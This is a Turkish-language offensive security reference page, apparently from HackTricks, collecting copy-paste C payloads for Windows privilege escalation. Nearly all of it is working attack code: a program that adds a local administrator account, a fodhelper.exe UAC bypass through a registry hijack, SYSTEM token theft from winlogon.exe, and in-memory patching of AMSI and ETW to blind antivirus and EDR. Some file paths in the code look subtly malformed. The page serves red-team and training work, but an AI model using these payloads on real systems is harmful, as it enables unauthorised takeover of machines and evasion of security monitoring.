# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Windows Local Privilege Escalation veya post-exploitation sırasında kullanışlı olan **küçük, kendi içinde bağımsız C snippet'lerini** toplar. Her payload, **kopyala-yapıştır dostu** olacak şekilde tasarlanmıştır, yalnızca Windows API / C runtime gerektirir ve `i686-w64-mingw32-gcc` (x86) veya `x86_64-w64-mingw32-gcc` (x64) ile derlenebilir.

> ⚠️  Bu payload'ların, işlemin eylemi gerçekleştirmek için gerekli asgari ayrıcalıklara zaten sahip olduğunu varsaydığını unutmayın (ör. `SeDebugPrivilege`, `SeImpersonatePrivilege`, veya bir UAC bypass için medium-integrity context). Bu payloadlar, bir güvenlik açığının rastgele native kod çalıştırmaya yol açtığı **red-team veya CTF ortamları** için tasarlanmıştır.

---

## Yerel yönetici kullanıcısı ekle
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Güvenilir ikili **`fodhelper.exe`** çalıştırıldığında, aşağıdaki kayıt defteri yolunu **`DelegateExecute` fiilini filtrelemeden** sorgular. Bu anahtarın altına komutumuzu yerleştirerek bir saldırgan, UAC'yi *dosyayı diske yazmadan* bypass edebilir.

*`fodhelper.exe` tarafından sorgulanan kayıt defteri yolu*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Yükseltilmiş `cmd.exe` açan minimal PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 ve Windows 11 23H2 (Temmuz 2025 yamaları) üzerinde test edildi. Bypass hâlâ çalışıyor çünkü Microsoft `DelegateExecute` yolundaki eksik bütünlük denetimini düzeltmedi.*

---

## Token çoğaltma yoluyla SYSTEM shell başlatma (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Eğer mevcut süreç **hem** `SeDebug` hem de `SeImpersonate` ayrıcalıklarına sahipse (birçok servis hesabı için tipik), `winlogon.exe`'den token çalabilir, çoğaltabilir ve yükseltilmiş bir süreç başlatabilirsiniz:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Bunun nasıl çalıştığının daha derin bir açıklaması için bakınız:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Bellek içi AMSI & ETW Yaması (Defence Evasion)
Çoğu modern AV/EDR motoru, kötü amaçlı davranışları incelemek için **AMSI** ve **ETW**'ye güvenir. Her iki arayüzün de mevcut işlem içinde erken yamanması, script tabanlı payload'ların (ör. PowerShell, JScript) taranmasını engeller.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Yukarıdaki yama işlem düzeyindedir; çalıştırdıktan sonra yeni bir PowerShell başlatmak AMSI/ETW denetimi olmadan yürütülecektir.*

---

## Alt süreci Protected Process Light (PPL) olarak oluştur
Oluşturma sırasında bir alt süreç için PPL koruma seviyesi isteğinde bulunun `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` kullanarak. Bu belgelenmiş bir API'dir ve yalnızca hedef imaj istenen imzalayıcı sınıfı için imzalanmışsa başarılı olur (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
En yaygın kullanılan seviyeler:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Sonucu Process Explorer/Process Hacker ile Protection sütununu kontrol ederek doğrulayın.

---

## Kaynaklar
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute

{{#include ../../banners/hacktricks-training.md}}
